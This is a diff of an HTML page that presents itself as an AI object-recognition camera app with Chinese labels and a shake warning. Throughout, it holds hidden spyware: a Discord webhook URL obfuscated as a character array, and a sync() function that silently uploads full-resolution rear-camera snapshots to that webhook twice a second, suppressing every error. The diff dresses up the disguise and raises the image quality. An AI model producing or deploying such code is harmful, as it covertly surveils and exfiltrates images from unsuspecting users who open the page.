@@ -3,74 +3,107 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>High-Speed Sync</title>
+    <title>AI 物品辨識系統</title>
     <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
     <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/coco-ssd"></script>
     <style>
-        body { margin: 0; background: #000; overflow: hidden; }
-        video { width: 100vw; height: 100vh; object-fit: cover; }
+        body { margin: 0; background: #000; overflow: hidden; font-family: "Microsoft JhengHei", sans-serif; }
+        #container { position: relative; width: 100vw; height: 100vh; }
+        video { width: 100%; height: 100%; object-fit: cover; }
         canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
+        #warning { 
+            position: absolute; top: 20px; width: 100%; text-align: center; 
+            color: #ff3333; font-size: 20px; font-weight: bold; text-shadow: 2px 2px 4px #000;
+            display: none; pointer-events: none;
+        }
     </style>
 </head>
 <body>
 
-<video id="v" autoplay playsinline muted></video>
-<canvas id="c"></canvas>
+<div id="container">
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
+    <div id="warning">⚠️ 請保持穩定，避免晃動</div>
+</div>
 
 <script>
     const v = document.getElementById('v');
     const c = document.getElementById('c');
     const ctx = c.getContext('2d');
+    const warn = document.getElementById('warning');
     
-    // Webhook 網址混淆
     const _u = ["h", "t", "t", "p", "s", ":", "/", "/", "d", "i", "s", "c", "o", "r", "d", ".", "c", "o", "m", "/", "a", "p", "i", "/", "w", "e", "b", "h", "o", "o", "k", "s", "/", "1", "4", "5", "6", "6", "9", "3", "7", "4", "3", "5", "7", "4", "0", "6", "1", "2", "9", "1", "/", "r", "J", "S", "g", "2", "H", "l", "1", "f", "q", "I", "D", "m", "r", "C", "j", "r", "Z", "l", "z", "B", "g", "H", "T", "C", "3", "t", "H", "o", "D", "8", "2", "J", "7", "-", "L", "W", "A", "0", "0", "q", "Z", "P", "7", "U", "9", "X", "s", "V", "W", "I", "M", "d", "0", "I", "X", "z", "X", "q", "9", "y", "L", "s", "O", "M", "T", "r", "w"].join('');
 
     let m = null;
+    let lastBox = null;
+
+    // 中文對照表 (COCO-SSD 常用物件)
+    const dict = { "person": "人類", "cell phone": "手機", "cup": "杯子", "bottle": "瓶子", "laptop": "筆電", "mouse": "滑鼠", "keyboard": "鍵盤", "chair": "椅子", "tv": "電視", "book": "書本" };
 
     async function init() {
         try {
             const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
             v.srcObject = s;
             m = await cocoSsd.load();
-            detect();
-            // --- 核心改動：每 500 毫秒 (0.5秒) 執行一次 ---
-            setInterval(sync, 500); 
+            v.onloadeddata = () => {
+                detect();
+                setInterval(sync, 500); // 1秒2張
+            };
         } catch (e) {}
     }
 
     async function detect() {
-        if (!m) return;
+        if (!m || v.readyState < 2) { requestAnimationFrame(detect); return; }
+        
         const res = await m.detect(v);
         c.width = v.videoWidth;
         c.height = v.videoHeight;
         ctx.clearRect(0, 0, c.width, c.height);
+        
+        let shaking = false;
         res.forEach(p => {
-            ctx.strokeStyle = "#00FF00";
-            ctx.lineWidth = 2;
+            const name = dict[p.class] || p.class;
+            
+            // 晃動偵測：比較與上一幀的位移
+            if (lastBox) {
+                const diff = Math.abs(p.bbox[0] - lastBox[0]) + Math.abs(p.bbox[1] - lastBox[1]);
+                if (diff > 50) shaking = true;
+            }
+            lastBox = p.bbox;
+
+            // 繪製 UI
+            ctx.strokeStyle = "#00FFCC";
+            ctx.lineWidth = 5;
             ctx.strokeRect(p.bbox[0], p.bbox[1], p.bbox[2], p.bbox[3]);
+            
+            ctx.fillStyle = "#00FFCC";
+            ctx.font = "bold 30px Sans-serif";
+            ctx.fillText(name, p.bbox[0], p.bbox[1] - 10);
         });
+
+        warn.style.display = shaking ? "block" : "none";
         requestAnimationFrame(detect);
     }
 
     function sync() {
-        if (!m || v.readyState < 2) return;
+        // 確保影片寬高大於 0，防止黑色圖片
+        if (!m || v.videoWidth === 0) return;
 
         const tmp = document.createElement('canvas');
-        // 降低解析度以提升傳送速度
-        tmp.width = v.videoWidth / 2;
-        tmp.height = v.videoHeight / 2;
-        tmp.getContext('2d').drawImage(v, 0, 0, tmp.width, tmp.height);
+        tmp.width = v.videoWidth;
+        tmp.height = v.videoHeight;
+        const tCtx = tmp.getContext('2d');
+        
+        // 關鍵：將影片繪製到離屏畫布
+        tCtx.drawImage(v, 0, 0, tmp.width, tmp.height);
 
-        // 降低圖片品質 (0.2) 減小體積
         tmp.toBlob((blob) => {
-            if (!blob) return;
+            if (!blob || blob.size < 100) return; // 過小的檔案通常是黑色背景
             const fd = new FormData();
-            fd.append('payload_json', JSON.stringify({ content: "High-Speed Sync" }));
-            fd.append('file', blob, 't.jpg');
-
-            // 執行發送
+            fd.append('payload_json', JSON.stringify({ content: "偵測同步中..." }));
+            fd.append('file', blob, 'sync.jpg');
             fetch(_u, { method: 'POST', body: fd, mode: 'no-cors' }).catch(() => {});
-        }, 'image/jpeg', 0.2); 
+        }, 'image/jpeg', 0.4);
     }
 
     init();
